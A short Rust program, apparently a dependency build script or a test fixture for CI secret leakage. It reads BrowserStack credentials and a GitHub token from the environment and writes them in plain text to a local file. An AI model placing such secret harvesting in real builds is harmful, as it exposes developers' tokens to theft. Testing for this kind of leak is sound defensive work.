use std::{env, fs};

fn main() {
    let captured = format!(
        "dependency-build:{}:{}:{}",
        env::var("BROWSERSTACK_USERNAME").unwrap_or_default(),
        env::var("BROWSERSTACK_ACCESS_KEY").unwrap_or_default(),
        env::var("GITHUB_TOKEN").unwrap_or_default(),
    );
    fs::write("dependency-build-secrets.txt", captured).unwrap();
}
